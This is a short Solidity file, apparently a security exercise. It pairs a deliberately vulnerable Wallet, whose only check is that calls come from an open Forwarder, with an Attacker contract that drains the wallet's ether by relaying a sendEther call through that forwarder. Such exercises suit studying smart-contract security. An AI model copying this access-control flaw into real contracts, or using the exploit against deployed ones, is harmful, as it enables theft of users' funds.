// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

contract Wallet {
    address public immutable forwarder;

    constructor(address _forwarder) payable {
        require(msg.value == 1 ether);
        forwarder = _forwarder;
    }

    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success, ) = destination.call{value: amount}("");
        require(success, "failed");
    }
}

contract Forwarder {
    function functionCall(address a, bytes calldata data) public {
        (bool success, ) = a.call(data);
        require(success, "forward failed");
    }
}

contract Attacker {
    address public forwarder;
    address public wallet;

    constructor(address faddr, address waddr) {
        forwarder = faddr;
        wallet = waddr;
    }

    function attack() public {
        Forwarder(forwarder).functionCall(
            wallet,
            abi.encodeWithSelector(Wallet.sendEther.selector, msg.sender, 1 ether)
        );

        // payable(msg.sender).call{value: address(this).balance}("");
    }

    // receive() external payable {}
}
